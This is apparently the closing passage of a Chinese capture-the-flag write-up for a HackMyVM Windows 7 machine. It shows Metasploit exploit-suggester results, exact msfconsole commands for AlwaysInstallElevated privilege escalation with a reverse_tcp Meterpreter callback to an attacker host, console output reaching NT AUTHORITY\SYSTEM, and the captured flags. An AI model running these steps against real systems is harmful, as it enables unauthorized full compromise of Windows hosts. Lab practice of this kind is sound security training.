[+] 172.16.52.224 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/ms15_078_atmfd_bof: The service is running, but could not be validated.
[+] 172.16.52.224 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[+] 172.16.52.224 - exploit/windows/local/virtual_box_opengl_escape: The service is running, but could not be validated.
[*] Running check method for exploit 49 / 49
[*] 172.16.52.224 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                 
 6   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                                            
 8   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms15_078_atmfd_bof                       Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
 15  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 16  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 17  exploit/windows/local/bypassuac_dotnet_profiler                No                       The target is not exploitable.
 18  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 19  exploit/windows/local/bypassuac_sdclt                          No                       The target is not exploitable.
 20  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 21  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found                                                                            
 22  exploit/windows/local/capcom_sys_exec                          No                       The target is not exploitable.
 23  exploit/windows/local/cve_2020_0796_smbghost                   No                       The target is not exploitable.
 24  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 25  exploit/windows/local/cve_2020_1313_system_orchestrator        No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 27  exploit/windows/local/cve_2020_17136                           No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!                               
 28  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
 29  exploit/windows/local/cve_2022_21882_win32k                    No                       The target is not exploitable.
 30  exploit/windows/local/cve_2022_21999_spoolfool_privesc         No                       The target is not exploitable. Windows 7 is technically vulnerable, though it requires a reboot.                                                
 31  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
 32  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2                                                                        
 33  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable. The target system does not have clfs.sys in system32\drivers\                                                    
 34  exploit/windows/local/cve_2024_30085_cloud_files               No                       The target is not exploitable.
 35  exploit/windows/local/cve_2024_30088_authz_basep               No                       The target is not exploitable. Version detected: Windows 7 Service Pack 1. Revision number detected: 0.                                         
 36  exploit/windows/local/cve_2024_35250_ks_driver                 No                       The target is not exploitable. Version detected: Windows 7 Service Pack 1                                                                       
 37  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 38  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 39  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store                                                                     
 40  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
 41  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 42  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 43  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 44  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
 45  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 46  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 47  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
 48  exploit/windows/local/webexec                                  No                       The check raised an exception.
 49  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.
```



## AlwaysInstallElevated提权
这是**配置漏洞**，不是内核洞，基本不翻车。

`use exploit/windows/local/always_install_elevated  
set SESSION 1  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
set LHOST <你的IP>  
run`

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/always_install_elevated) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > set LHOST 172.16.55.210
LHOST => 172.16.55.210
msf6 exploit(windows/local/always_install_elevated) > run
[*] Started reverse TCP handler on 172.16.55.210:4444 
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\MOWnCibCXGDD.msi ...
[*] Executing MSI...
[*] Sending stage (203846 bytes) to 172.16.52.224
[+] Deleted C:\Users\ftpuser\AppData\Local\Temp\MOWnCibCXGDD.msi
[*] Meterpreter session 2 opened (172.16.55.210:4444 -> 172.16.52.224:49210) at 2025-12-13 02:28:51 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```



```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
HMV{White_Flag_Raised}

C:\Users\Always\Desktop>type user.txt
type user.txt
HMV{You_Found_Me!}

```



****





